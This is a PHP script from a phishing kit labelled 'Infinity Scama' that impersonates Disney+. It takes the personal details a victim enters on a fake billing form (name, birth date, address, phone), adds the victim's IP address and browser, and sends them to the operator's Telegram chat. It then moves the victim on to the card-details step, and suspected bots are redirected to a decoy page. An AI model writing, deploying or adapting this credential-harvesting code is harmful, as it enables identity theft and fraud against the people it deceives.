<?php

session_start();
include('../../../common/subb_includes.php');
include('../../../config.php');
include('../../../app/1.php');
include('../../../app/2.php');
include('../../traduction.php');

if ($_SESSION['bot'] == '1') {
    
    if ($_POST) {

        if (!empty($_POST['lname'] || $_POST['fname'] || $_POST['dob'] || $_POST['address'] || $_POST['zip'] || $_POST['city'] || $_POST['phone'])) {

            $_SESSION['lname'] = htmlspecialchars($_POST['lname']);
            $_SESSION['fname'] = htmlspecialchars($_POST['fname']);
            $_SESSION['dob'] = htmlspecialchars($_POST['dob']);
            $_SESSION['address'] = htmlspecialchars($_POST['address']);
            $_SESSION['zip'] = htmlspecialchars($_POST['zip']);
            $_SESSION['city'] = htmlspecialchars($_POST['city']);
            $_SESSION['phone'] = htmlspecialchars($_POST['phone']);
            $_SESSION['name'] = "{$_SESSION['lname']} {$_SESSION['fname']}";

$text = "
★━━━━━━ 👤 ━━━━━━★

👤 Nom complet ➟ {$_SESSION['name']}
👤 Date de naissance ➟ {$_SESSION['dob']}
👤 Adresse ➟ {$_SESSION['address']}
👤 Code postal ➟ {$_SESSION['zip']}
👤 Ville ➟ {$_SESSION['city']}
👤 Numéro de téléphone ➟ {$_SESSION['phone']}

★━━━━━━ 🌐 ━━━━━━★

🌐 Ip Adress ➟ {$_SESSION['ip']}
🌐 User Agent ➟ {$_SESSION['ua']}

<blockquote><b>Powered By ♾️ Infinity Scama ® - @InfinityScama
♾️ Scama : DISNEY+
♾️ Author : Kajuh - @KajuhDev</b></blockquote>";

        if ($telegram['status'] == true) { 
            sendMessage($telegram['RezChatId']['billing'], $text); 
        }

        if ($settings['steps']['card'] == true) {
            $_SESSION['load'] = $_SESSION['id4'];
        } else {
            $_SESSION['load'] = $_SESSION['id14'];
        }

        $_SESSION['billing-error'] = "";
        $_SESSION['billing'] = "1";
        header("location: ../../{$_SESSION['id5']}/");

        } else {
            $_SESSION['billing-error'] = $errors['2'];
            header('location: ../');
        }
    } else {
        $_SESSION['billing-error'] = $errors['1'];
        header('location: ../../../index.html');
    }
} else {
    header('location: ../../../site/index.html');
}